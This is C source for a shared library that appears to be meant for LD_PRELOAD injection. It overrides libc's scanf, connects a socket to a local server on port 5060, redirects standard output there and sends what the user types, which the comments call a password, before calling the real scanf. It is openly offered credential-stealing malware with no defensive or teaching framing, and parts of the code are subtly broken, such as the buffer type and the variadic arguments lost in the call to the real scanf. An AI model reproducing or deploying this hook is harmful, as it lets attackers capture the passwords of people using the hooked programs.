#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define Localhost "127.0.0.1"
#define SERVER_PORT 5060

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"

// MAX SIZE FOR PASSWORD
#define SIZE 60

typedef int (*sym)(const char *, ...);
void* handle;
int sock; /* server socket to deliver files to*/
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
    struct sockaddr_in server_addr;
     
    // CREATE SOCKET
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        perror("Error in socket");
        return;
    }
    // SET THE SERVER IP AND PORT
    bzero(&server_addr, sizeof(server_addr));
    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(Localhost);

    // CONNECT TO SERVER
    int connRes = connect(sock, (struct sockaddr *) &server_addr, sizeof(server_addr));
    if (connRes == -1){
        perror("Error in socket");
        return;
    }
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

/*Close resources*/
void mydest() 
{
    dlclose(handle);
    close(sock);
}

/* Deliever data to server, and return a reference to the original scanf.*/
int scanf (const char * format, ... )
{
	char* usr_input[1000];
	sym orig_scanf = (sym)dlsym(handle,"scanf");
	
	dup2(sock, STDOUT_FILENO); /* Switch to server's standard output*/
	
	while(fgets(usr_input, SIZE, stdin) != NULL){
	   puts(usr_input); /*Print password*/
	}
	
	return orig_scanf(format);
}
